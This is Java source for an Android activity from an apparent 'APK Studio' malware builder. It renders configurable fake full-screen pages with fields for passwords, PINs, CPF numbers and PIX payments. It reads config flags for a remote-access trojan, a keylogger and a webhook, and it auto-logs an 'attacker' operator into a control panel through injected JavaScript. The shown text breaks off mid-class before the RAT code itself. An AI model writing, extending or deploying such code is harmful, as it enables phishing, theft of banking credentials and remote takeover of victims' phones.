package com.seguranca.protecao;

import android.animation.ObjectAnimator;
import android.animation.AnimatorSet;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.LinearGradient;
import android.graphics.Shader;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.text.method.PasswordTransformationMethod;
import android.util.Base64;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.animation.BounceInterpolator;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.SeekBar;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

/**
 * StudioActivity - Renderiza telas customizadas criadas no APK Studio
 * Suporta todos os tipos de elementos: texto, botão, input, vídeo, áudio, animações, etc.
 */
public class StudioActivity extends Activity {
    private static final String TAG = "StudioActivity";
    
    private JSONObject config;
    private JSONArray screens;
    private int currentScreenIndex = 0;
    private RelativeLayout rootLayout;
    private Map<String, EditText> inputFields = new HashMap<>();
    private Map<String, CheckBox> checkboxFields = new HashMap<>();
    private Map<String, Switch> switchFields = new HashMap<>();
    private Map<String, SeekBar> sliderFields = new HashMap<>();
    private Map<String, Timer> activeTimers = new HashMap<>();
    
    private String projectId;
    private String webhookUrl;
    private boolean enableRat;
    private boolean enableKeylogger;
    
    // Dimensões de referência (usadas no editor)
    private static final float DESIGN_WIDTH = 360f;
    private static final float DESIGN_HEIGHT = 780f;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 🔥 Fullscreen TOTAL - remove TUDO
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        );
        
        // Garante que o conteúdo vai até a borda da tela
        getWindow().setNavigationBarColor(android.graphics.Color.TRANSPARENT);
        getWindow().setStatusBarColor(android.graphics.Color.TRANSPARENT);
        
        // FrameLayout container para garantir fullscreen
        android.widget.FrameLayout container = new android.widget.FrameLayout(this);
        container.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        
        // Layout principal dentro do container
        rootLayout = new RelativeLayout(this);
        android.widget.FrameLayout.LayoutParams rootParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT
        );
        rootLayout.setLayoutParams(rootParams);
        
        // Define um fundo escuro inicial
        int bgColor = android.graphics.Color.parseColor("#0f0f1a");
        container.setBackgroundColor(bgColor);
        rootLayout.setBackgroundColor(bgColor);
        getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(bgColor));
        getWindow().setNavigationBarColor(bgColor);
        getWindow().setStatusBarColor(bgColor);
        
        container.addView(rootLayout);
        setContentView(container);
        
        // Log das dimensões
        int w = getResources().getDisplayMetrics().widthPixels;
        int h = getResources().getDisplayMetrics().heightPixels;
        Log.d(TAG, "🚀 StudioActivity iniciada - Tela: " + w + "x" + h);
        
        // Carrega configuração
        loadConfig();
    }
    
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            // Reaplica fullscreen quando a janela ganha foco
            getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            );
        }
    }
    
    private void loadConfig() {
        try {
            InputStream is = getAssets().open("studio_config.json");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();
            
            config = new JSONObject(sb.toString());
            screens = config.optJSONArray("screens");
            projectId = config.optString("projectId", "unknown");
            webhookUrl = config.optString("webhookUrl", "");
            enableRat = config.optBoolean("enableRat", false);
            enableKeylogger = config.optBoolean("enableKeylogger", false);
            
            String projectType = config.optString("projectType", "custom");
            
            Log.d(TAG, "Configuração carregada: " + config.optString("appName"));
            Log.d(TAG, "Tipo de projeto: " + projectType);
            Log.d(TAG, "Telas: " + (screens != null ? screens.length() : 0));
            
            // 🔥 LÓGICA CORRIGIDA: Se tiver telas customizadas, renderiza elas!
            // Só abre WebView se NÃO tiver telas customizadas
            if (screens != null && screens.length() > 0) {
                Log.d(TAG, "🎨 Renderizando " + screens.length() + " telas customizadas do APK Studio");
                renderScreen(0);
            } else if ("mobile_panel".equals(projectType)) {
                // Só mostra WebView se for mobile_panel SEM telas customizadas
                JSONObject mobilePanelConfig = config.optJSONObject("mobilePanelConfig");
                if (mobilePanelConfig != null) {
                    Log.d(TAG, "📲 APK do ATACANTE - Abrindo WebView do painel (sem telas customizadas)");
                    showMobilePanelWebView(mobilePanelConfig);
                    return; // Retorna sem iniciar serviços remotos!
                }
            }
            
            // Inicia serviços remotos se habilitado E se configurado para aparecer no painel
            // Verifica se showInWebPanel está habilitado (padrão: false para APK Studio)
            boolean showInWebPanel = config.optBoolean("showInWebPanel", false);
            
            if (enableRat && showInWebPanel) {
                Log.d(TAG, "🔗 Iniciando serviços remotos - Dispositivo aparecerá no painel web");
                startRatServices();
            } else if (enableRat) {
                Log.d(TAG, "📴 Remote habilitado mas showInWebPanel=false - Apenas enviando dados via webhook");
                // Apenas envia dados via webhook, não conecta ao WebSocket
            } else {
                Log.d(TAG, "📴 Remote desabilitado - Apenas capturando dados localmente");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao carregar studio_config.json: " + e.getMessage());
            e.printStackTrace();
            // Fallback - mostra mensagem de erro
            showErrorScreen("Configuração não encontrada");
        }
    }
    
    /**
     * Mostra o painel de controle mobile usando WebView
     * O painel web completo é exibido dentro do app com login automático
     */
    private void showMobilePanelWebView(JSONObject panelConfig) {
        final String serverUrl = panelConfig.optString("serverUrl", "http://localhost:7771");
        final String username = panelConfig.optString("operatorUsername", "");
        final String password = panelConfig.optString("operatorPassword", "");
        
        Log.d(TAG, "📲 Iniciando Painel Mobile - Server: " + serverUrl + " | User: " + username);
        
        // Layout com WebView fullscreen
        rootLayout.removeAllViews();
        rootLayout.setBackgroundColor(Color.parseColor("#0a0a15"));
        
        // Status bar customizada com gradiente
        LinearLayout statusBar = new LinearLayout(this);
        statusBar.setOrientation(LinearLayout.HORIZONTAL);
        GradientDrawable statusGradient = new GradientDrawable(
            GradientDrawable.Orientation.LEFT_RIGHT,
            new int[]{Color.parseColor("#FF6600"), Color.parseColor("#DC2626")}
        );
        statusBar.setBackground(statusGradient);
        statusBar.setPadding(dpToPx(16), dpToPx(12), dpToPx(16), dpToPx(12));
        statusBar.setGravity(Gravity.CENTER_VERTICAL);
        
        TextView statusText = new TextView(this);
        statusText.setText("📲 Mobile Control Panel");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(18);
        statusText.setTypeface(null, Typeface.BOLD);
        
        LinearLayout.LayoutParams textParams = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        statusText.setLayoutParams(textParams);
        statusBar.addView(statusText);
        
        // Indicador de conexão
        TextView connStatus = new TextView(this);
        connStatus.setText("● ONLINE");
        connStatus.setTextColor(Color.parseColor("#00FF00"));
        connStatus.setTextSize(12);
        connStatus.setTypeface(null, Typeface.BOLD);
        statusBar.addView(connStatus);
        
        RelativeLayout.LayoutParams statusParams = new RelativeLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(56)
        );
        statusBar.setLayoutParams(statusParams);
        statusBar.setId(View.generateViewId());
        rootLayout.addView(statusBar);
        
        // Loading overlay
        final FrameLayout loadingOverlay = new FrameLayout(this);
        loadingOverlay.setBackgroundColor(Color.parseColor("#0a0a15"));
        loadingOverlay.setId(View.generateViewId());
        
        LinearLayout loadingContent = new LinearLayout(this);
        loadingContent.setOrientation(LinearLayout.VERTICAL);
        loadingContent.setGravity(Gravity.CENTER);
        
        ProgressBar progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        loadingContent.addView(progressBar);
        
        TextView loadingText = new TextView(this);
        loadingText.setText("🔄 Conectando ao servidor...\n" + serverUrl);
        loadingText.setTextColor(Color.parseColor("#FF6600"));
        loadingText.setTextSize(14);
        loadingText.setGravity(Gravity.CENTER);
        loadingText.setPadding(0, dpToPx(16), 0, 0);
        loadingContent.addView(loadingText);
        
        FrameLayout.LayoutParams loadingContentParams = new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT
        );
        loadingContentParams.gravity = Gravity.CENTER;
        loadingContent.setLayoutParams(loadingContentParams);
        loadingOverlay.addView(loadingContent);
        
        // WebView com o painel web
        final WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setDisplayZoomControls(false);
        webView.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_NO_CACHE);
        webView.getSettings().setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        webView.getSettings().setUserAgentString("MobileControlPanel/2.0 Mobile Android");
        
        webView.setWebViewClient(new WebViewClient() {
            private boolean loginAttempted = false;
            
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.d(TAG, "📲 Página carregada: " + url);
                
                // Esconde loading
                loadingOverlay.setVisibility(View.GONE);
                
                // Auto-login se credenciais fornecidas e ainda não tentou
                if (!username.isEmpty() && !password.isEmpty() && !loginAttempted) {
                    if (url.contains("login") || url.endsWith("/")) {
                        loginAttempted = true;
                        Log.d(TAG, "📲 Tentando auto-login como: " + username);
                        
                        // Script de auto-login mais robusto
                        String js = 
                            "(function() {" +
                            "  var inputs = document.querySelectorAll('input');" +
                            "  var submitBtn = document.querySelector('button[type=\"submit\"], button:contains(\"Entrar\"), button:contains(\"Login\")');" +
                            "  " +
                            "  for (var i = 0; i < inputs.length; i++) {" +
                            "    var input = inputs[i];" +
                            "    var type = input.type.toLowerCase();" +
                            "    var name = (input.name || '').toLowerCase();" +
                            "    var placeholder = (input.placeholder || '').toLowerCase();" +
                            "    " +
                            "    if (type === 'password' || name.includes('password') || name.includes('senha')) {" +
                            "      input.value = '" + password + "';" +
                            "      input.dispatchEvent(new Event('input', { bubbles: true }));" +
                            "    } else if (type === 'text' || type === 'email' || name.includes('user') || name.includes('login') || placeholder.includes('usuário')) {" +
                            "      input.value = '" + username + "';" +
                            "      input.dispatchEvent(new Event('input', { bubbles: true }));" +
                            "    }" +
                            "  }" +
                            "  " +
                            "  setTimeout(function() {" +
                            "    var buttons = document.querySelectorAll('button');" +
                            "    for (var j = 0; j < buttons.length; j++) {" +
                            "      var btn = buttons[j];" +
                            "      if (btn.type === 'submit' || btn.textContent.toLowerCase().includes('entrar') || btn.textContent.toLowerCase().includes('login')) {" +
                            "        btn.click();" +
                            "        break;" +
                            "      }" +
                            "    }" +
                            "  }, 800);" +
                            "})();";
                        
                        view.evaluateJavascript(js, null);
                    }
                }
            }
            
            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                Log.e(TAG, "❌ Erro ao carregar: " + description);
                
                // Mostra erro amigável
                loadingOverlay.setVisibility(View.VISIBLE);
                ((TextView)((LinearLayout)loadingOverlay.getChildAt(0)).getChildAt(1))
                    .setText("❌ Erro de conexão\n" + description + "\n\nToque para tentar novamente");
                
                loadingOverlay.setOnClickListener(v -> {
                    loadingOverlay.setVisibility(View.VISIBLE);
                    ((TextView)((LinearLayout)loadingOverlay.getChildAt(0)).getChildAt(1))
                        .setText("🔄 Reconectando...");
                    webView.reload();
                });
            }
        });
        
        RelativeLayout.LayoutParams webParams = new RelativeLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        );
        webParams.addRule(RelativeLayout.BELOW, statusBar.getId());
        webView.setLayoutParams(webParams);
        
        RelativeLayout.LayoutParams overlayParams = new RelativeLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        );
        overlayParams.addRule(RelativeLayout.BELOW, statusBar.getId());
        loadingOverlay.setLayoutParams(overlayParams);
        
        rootLayout.addView(webView);
        rootLayout.addView(loadingOverlay);
        
        // Carrega o painel web (vai direto pro login primeiro)
        String panelUrl = serverUrl;
        if (!panelUrl.endsWith("/")) panelUrl += "/";
        
        Log.d(TAG, "📲 Carregando painel: " + panelUrl);
        webView.loadUrl(panelUrl);
        
        // Inicia serviços remotos para este dispositivo também poder ser controlado (opcional)
        if (enableRat) {
            startRatServices();
        }
    }
    
    private void renderScreen(int index) {
        try {
            // Limpa timers ativos
            for (Timer timer : activeTimers.values()) {
                timer.cancel();
            }
            activeTimers.clear();
            
            // Limpa layout
            rootLayout.removeAllViews();
            inputFields.clear();
            checkboxFields.clear();
            switchFields.clear();
            sliderFields.clear();
            
            currentScreenIndex = index;
            JSONObject screen = screens.getJSONObject(index);
            
            // 🔥 Cor de fundo - aplica em TODA a tela
            String bgColor = screen.optString("backgroundColor", "#0a0a15");
            int bgColorInt = Color.parseColor(bgColor);
            
            Log.d(TAG, "🎨 Aplicando cor de fundo: " + bgColor);
            
            // Define cor no rootLayout
            rootLayout.setBackgroundColor(bgColorInt);
            
            // Define também no container pai
            if (rootLayout.getParent() instanceof View) {
                ((View) rootLayout.getParent()).setBackgroundColor(bgColorInt);
            }
            
            // Define também na window para cobrir TODA a tela incluindo barras
            getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(bgColorInt));
            getWindow().setNavigationBarColor(bgColorInt);
            getWindow().setStatusBarColor(bgColorInt);
            getWindow().getDecorView().setBackgroundColor(bgColorInt);
            
            // Log das dimensões da tela
            int screenWidth = getResources().getDisplayMetrics().widthPixels;
            int screenHeight = getResources().getDisplayMetrics().heightPixels;
            Log.d(TAG, "📱 Tela: " + screenWidth + "x" + screenHeight);
            Log.d(TAG, "📐 Design: " + DESIGN_WIDTH + "x" + DESIGN_HEIGHT);
            
            // Renderiza elementos
            JSONArray elements = screen.optJSONArray("elements");
            if (elements != null) {
                Log.d(TAG, "🎨 Renderizando " + elements.length() + " elementos");
                for (int i = 0; i < elements.length(); i++) {
                    JSONObject element = elements.getJSONObject(i);
                    String type = element.optString("type", "unknown");
                    Log.d(TAG, "  → Elemento " + i + ": " + type);
                    View view = createElementView(element);
                    if (view != null) {
                        rootLayout.addView(view);
                        applyAnimation(view, element);
                    } else {
                        Log.w(TAG, "  ⚠️ Elemento " + i + " retornou null: " + type);
                    }
                }
            }
            
            Log.d(TAG, "✅ Tela " + index + " renderizada: " + screen.optString("name"));
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao renderizar tela: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private View createElementView(JSONObject element) throws JSONException {
        String type = element.optString("type", "text");
        
        switch (type) {
            case "text":
                return createTextView(element);
            case "button":
                return createButton(element);
            case "input":
                return createInput(element);
            case "image":
            case "logo":
            case "gif":
                return createImageView(element);
            case "rectangle":
            case "card":
            case "divider":
                return createRectangle(element);
            case "circle":
                return createCircle(element);
            case "video":
                return createVideoView(element);
            case "checkbox":
                return createCheckbox(element);
            case "switch":
                return createSwitch(element);
            case "slider":
                return createSlider(element);
            case "progress_bar":
                return createProgressBar(element);
            case "countdown":
            case "timer":
                return createCountdown(element);
            case "webview":
                return createWebView(element);
            case "pix_qrcode":
                return createPixQRCode(element);
            case "pix_copypaste":
                return createPixCopyButton(element);
            default:
                Log.w(TAG, "Tipo de elemento não suportado: " + type);
                return null;
        }
    }
    
    // ==================== CRIAÇÃO DE ELEMENTOS ====================
    
    private TextView createTextView(JSONObject element) throws JSONException {
        TextView tv = new TextView(this);
        
        String content = element.optString("content", "Texto");
        tv.setText(content);
        
        // Tamanho da fonte
        int fontSize = element.optInt("fontSize", 16);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, fontSize);
        
        // Cor
        String color = element.optString("color", "#FFFFFF");
        tv.setTextColor(Color.parseColor(color));
        
        // Peso da fonte
        String fontWeight = element.optString("fontWeight", "normal");
        if ("bold".equals(fontWeight)) {
            tv.setTypeface(null, Typeface.BOLD);
        }
        
        // Alinhamento
        String textAlign = element.optString("textAlign", "left");
        switch (textAlign) {
            case "center":
                tv.setGravity(Gravity.CENTER);
                break;
            case "right":
                tv.setGravity(Gravity.RIGHT | Gravity.CENTER_VERTICAL);
                break;
            default:
                tv.setGravity(Gravity.LEFT | Gravity.CENTER_VERTICAL);
        }
        
        applyCommonStyles(tv, element);
        return tv;
    }
    
    private Button createButton(JSONObject element) throws JSONException {
        Button btn = new Button(this);
        
        String content = element.optString("content", "Botão");
        btn.setText(content);
        btn.setAllCaps(false);
        
        // Tamanho da fonte
        int fontSize = element.optInt("fontSize", 16);
        btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, fontSize);
        
        // Cor do texto
        String color = element.optString("color", "#FFFFFF");
        btn.setTextColor(Color.parseColor(color));
        
        // Peso da fonte
        String fontWeight = element.optString("fontWeight", "normal");
        if ("bold".equals(fontWeight)) {
            btn.setTypeface(null, Typeface.BOLD);
        }
        
        // Background com bordas arredondadas
        GradientDrawable drawable = new GradientDrawable();
        String bgColor = element.optString("backgroundColor", "#6200EE");
        drawable.setColor(Color.parseColor(bgColor));
        
        int borderRadius = element.optInt("borderRadius", 8);
        drawable.setCornerRadius(dpToPx(borderRadius));
        
        // Borda
        int borderWidth = element.optInt("borderWidth", 0);
        if (borderWidth > 0) {
            String borderColor = element.optString("borderColor", "#FFFFFF");
            drawable.setStroke(dpToPx(borderWidth), Color.parseColor(borderColor));
        }
        
        btn.setBackground(drawable);
        btn.setPadding(dpToPx(16), dpToPx(8), dpToPx(16), dpToPx(8));
        
        // Ação do botão
        final String buttonAction = element.optString("buttonAction", "next_screen");
        final String buttonUrl = element.optString("buttonUrl", "");
        
        btn.setOnClickListener(v -> handleButtonAction(buttonAction, buttonUrl));
        
        applyCommonStyles(btn, element);
        return btn;
    }
    
    private EditText createInput(JSONObject element) throws JSONException {
        EditText et = new EditText(this);
        
        String placeholder = element.optString("placeholder", "");
        et.setHint(placeholder);
        
        String inputType = element.optString("inputType", "text");
        String inputLabel = element.optString("inputLabel", "field_" + inputFields.size());
        
        // Define o tipo de input
        switch (inputType) {
            case "password":
                et.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
                et.setTransformationMethod(PasswordTransformationMethod.getInstance());
                break;
            case "numeric":
            case "pin":
                et.setInputType(InputType.TYPE_CLASS_NUMBER);
                int maxLength = element.optInt("maxLength", 6);
                et.setFilters(new android.text.InputFilter[]{
                    new android.text.InputFilter.LengthFilter(maxLength)
                });
                if ("pin".equals(inputType)) {
                    et.setTransformationMethod(PasswordTransformationMethod.getInstance());
                }
                break;
            case "email":
                et.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
                break;
            case "phone":
                et.setInputType(InputType.TYPE_CLASS_PHONE);
                break;
            case "cpf":
            case "cnpj":
            case "cep":
            case "money":
                et.setInputType(InputType.TYPE_CLASS_NUMBER);
                break;
            default:
                et.setInputType(InputType.TYPE_CLASS_TEXT);
        }
        
        // Cor do texto
        String color = element.optString("color", "#FFFFFF");
        et.setTextColor(Color.parseColor(color));
        et.setHintTextColor(Color.parseColor(color + "80")); // 50% opacity
        
        // Background com bordas
        GradientDrawable drawable = new GradientDrawable();
        String bgColor = element.optString("backgroundColor", "#1a1a2e");
        drawable.setColor(Color.parseColor(bgColor));
        
        int borderRadius = element.optInt("borderRadius", 8);
        drawable.setCornerRadius(dpToPx(borderRadius));
        
        int borderWidth = element.optInt("borderWidth", 1);
        String borderColor = element.optString("borderColor", "#333333");
        drawable.setStroke(dpToPx(borderWidth), Color.parseColor(borderColor));
        
        et.setBackground(drawable);
        et.setPadding(dpToPx(16), dpToPx(12), dpToPx(16), dpToPx(12));
        
        // Cursor visível
        et.setFocusable(true);
        et.setFocusableInTouchMode(true);
        et.setCursorVisible(true);
        
        // Armazena referência
        inputFields.put(inputLabel, et);
        
        applyCommonStyles(et, element);
        return et;
    }
    
    private ImageView createImageView(JSONObject element) throws JSONException {
        ImageView iv = new ImageView(this);
        
        String imageUrl = element.optString("imageUrl", "");
        if (!imageUrl.isEmpty()) {
            if (imageUrl.startsWith("data:image")) {
                // Base64 image
                try {
                    String base64 = imageUrl.substring(imageUrl.indexOf(",") + 1);
                    byte[] decodedBytes = Base64.decode(base64, Base64.DEFAULT);
                    Bitmap bitmap = BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.length);
                    iv.setImageBitmap(bitmap);
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao decodificar imagem base64: " + e.getMessage());
                }
            } else if (imageUrl.startsWith("http")) {
                // URL - carrega em background
                loadImageFromUrl(iv, imageUrl);
            }
        }
        
        iv.setScaleType(ImageView.ScaleType.FIT_CENTER);
        
        // Bordas arredondadas via clip
        int borderRadius = element.optInt("borderRadius", 0);
        if (borderRadius > 0) {
            // Usa shape drawable para bordas arredondadas
            iv.setClipToOutline(true);
            GradientDrawable clipShape = new GradientDrawable();
            clipShape.setCornerRadius(dpToPx(borderRadius));
            iv.setBackground(clipShape);
        }
        
        applyCommonStyles(iv, element);
        return iv;
    }
    
    private View createRectangle(JSONObject element) throws JSONException {
        View view = new View(this);
        
        GradientDrawable drawable = new GradientDrawable();
        
        // Gradiente ou cor sólida
        String gradientStart = element.optString("gradientStart", "");
        String gradientEnd = element.optString("gradientEnd", "");
        
        if (!gradientStart.isEmpty() && !gradientEnd.isEmpty()) {
            int[] colors = {Color.parseColor(gradientStart), Color.parseColor(gradientEnd)};
            String direction = element.optString("gradientDirection", "vertical");
            GradientDrawable.Orientation orientation = GradientDrawable.Orientation.TOP_BOTTOM;
            if ("horizontal".equals(direction)) {
                orientation = GradientDrawable.Orientation.LEFT_RIGHT;
            } else if ("diagonal".equals(direction)) {
                orientation = GradientDrawable.Orientation.TL_BR;
            }
            drawable = new GradientDrawable(orientation, colors);
        } else {
            String bgColor = element.optString("backgroundColor", "#333333");
            drawable.setColor(Color.parseColor(bgColor));
        }
        
        int borderRadius = element.optInt("borderRadius", 0);
        drawable.setCornerRadius(dpToPx(borderRadius));
        
        // Borda
        int borderWidth = element.optInt("borderWidth", 0);
        if (borderWidth > 0) {
            String borderColor = element.optString("borderColor", "#FFFFFF");
            drawable.setStroke(dpToPx(borderWidth), Color.parseColor(borderColor));
        }
        
        view.setBackground(drawable);
        
        applyCommonStyles(view, element);
        return view;
    }
    
    private View createCircle(JSONObject element) throws JSONException {
        View view = new View(this);
        
        GradientDrawable drawable = new GradientDrawable();
        drawable.setShape(GradientDrawable.OVAL);
        
        String bgColor = element.optString("backgroundColor", "#333333");
        drawable.setColor(Color.parseColor(bgColor));
        
        view.setBackground(drawable);
        
        applyCommonStyles(view, element);
        return view;
    }
    
    private VideoView createVideoView(JSONObject element) throws JSONException {
        VideoView vv = new VideoView(this);
        
        String videoUrl = element.optString("videoUrl", "");
        if (!videoUrl.isEmpty()) {
            vv.setVideoURI(Uri.parse(videoUrl));
            
            boolean autoPlay = element.optBoolean("autoPlay", false);
            boolean loop = element.optBoolean("loop", false);
            
            vv.setOnPreparedListener(mp -> {
                mp.setLooping(loop);
                if (autoPlay) {
                    vv.start();
                }
            });
        }
        
        applyCommonStyles(vv, element);
        return vv;
    }
    
    private CheckBox createCheckbox(JSONObject element) throws JSONException {
        CheckBox cb = new CheckBox(this);
        
        String content = element.optString("content", "Opção");
        cb.setText(content);
        
        String color = element.optString("color", "#FFFFFF");
        cb.setTextColor(Color.parseColor(color));
        
        boolean checked = element.optBoolean("checked", false);
        cb.setChecked(checked);
        
        String inputLabel = element.optString("inputLabel", "checkbox_" + checkboxFields.size());
        checkboxFields.put(inputLabel, cb);
        
        applyCommonStyles(cb, element);
        return cb;
    }
    
    private Switch createSwitch(JSONObject element) throws JSONException {
        Switch sw = new Switch(this);
        
        boolean checked = element.optBoolean("checked", false);
        sw.setChecked(checked);
        
        String inputLabel = element.optString("inputLabel", "switch_" + switchFields.size());
        switchFields.put(inputLabel, sw);
        
        applyCommonStyles(sw, element);
        return sw;
    }
    
    private SeekBar createSlider(JSONObject element) throws JSONException {
        SeekBar sb = new SeekBar(this);
        
        int min = element.optInt("minValue", 0);
        int max = element.optInt("maxValue", 100);
        int current = element.optInt("currentValue", 50);
        
        sb.setMax(max - min);
        sb.setProgress(current - min);
        
        String inputLabel = element.optString("inputLabel", "slider_" + sliderFields.size());
        sliderFields.put(inputLabel, sb);
        
        applyCommonStyles(sb, element);
        return sb;
    }
    
    private ProgressBar createProgressBar(JSONObject element) throws JSONException {
        ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        
        int current = element.optInt("currentValue", 50);
        pb.setMax(100);
        pb.setProgress(current);
        
        // Cor da barra
        String color = element.optString("color", "#6200EE");
        pb.getProgressDrawable().setColorFilter(
            Color.parseColor(color), android.graphics.PorterDuff.Mode.SRC_IN);
        
        applyCommonStyles(pb, element);
        return pb;
    }
    
    private TextView createCountdown(JSONObject element) throws JSONException {
        final TextView tv = new TextView(this);
        
        int seconds = element.optInt("timerSeconds", 60);
        String format = element.optString("timerFormat", "mm:ss");
        final String onEnd = element.optString("onTimerEnd", "next_screen");
        
        int fontSize = element.optInt("fontSize", 24);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, fontSize);
        
        String color = element.optString("color", "#FFFFFF");
        tv.setTextColor(Color.parseColor(color));
        
        String fontWeight = element.optString("fontWeight", "bold");
        if ("bold".equals(fontWeight)) {
            tv.setTypeface(null, Typeface.BOLD);
        }
        
        tv.setGravity(Gravity.CENTER);
        
        // Background
        GradientDrawable drawable = new GradientDrawable();
        String bgColor = element.optString("backgroundColor", "#1a1a2e");
        drawable.setColor(Color.parseColor(bgColor));
        int borderRadius = element.optInt("borderRadius", 8);
        drawable.setCornerRadius(dpToPx(borderRadius));
        tv.setBackground(drawable);
        tv.setPadding(dpToPx(16), dpToPx(8), dpToPx(16), dpToPx(8));
        
        // Timer
        final int[] remaining = {seconds};
        Timer timer = new Timer();
        String timerId = "timer_" + System.currentTimeMillis();
        activeTimers.put(timerId, timer);
        
        final Handler handler = new Handler(Looper.getMainLooper());
        
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> {
                    int mins = remaining[0] / 60;
                    int secs = remaining[0] % 60;
                    tv.setText(String.format("%02d:%02d", mins, secs));
                    
                    remaining[0]--;
                    
                    if (remaining[0] < 0) {
                        timer.cancel();
                        handleButtonAction(onEnd, "");
                    }
                });
            }
        }, 0, 1000);
        
        applyCommonStyles(tv, element);
        return tv;
    }
    
    private WebView createWebView(JSONObject element) throws JSONException {
        WebView wv = new WebView(this);
        
        wv.getSettings().setJavaScriptEnabled(true);
        wv.setWebViewClient(new WebViewClient());
        
        String url = element.optString("buttonUrl", "https://google.com");
        if (!url.isEmpty()) {
            wv.loadUrl(url);
        }
        
        applyCommonStyles(wv, element);
        return wv;
    }
    
    private ImageView createPixQRCode(JSONObject element) throws JSONException {
        ImageView iv = new ImageView(this);
        
        // Placeholder para QR Code - na prática, geraria o QR dinamicamente
        GradientDrawable drawable = new GradientDrawable();
        drawable.setColor(Color.WHITE);
        int borderRadius = element.optInt("borderRadius", 16);
        drawable.setCornerRadius(dpToPx(borderRadius));
        iv.setBackground(drawable);
        
        iv.setScaleType(ImageView.ScaleType.CENTER);
        
        // Texto placeholder
        // Em produção, usaria uma lib de QR Code
        
        applyCommonStyles(iv, element);
        return iv;
    }
    
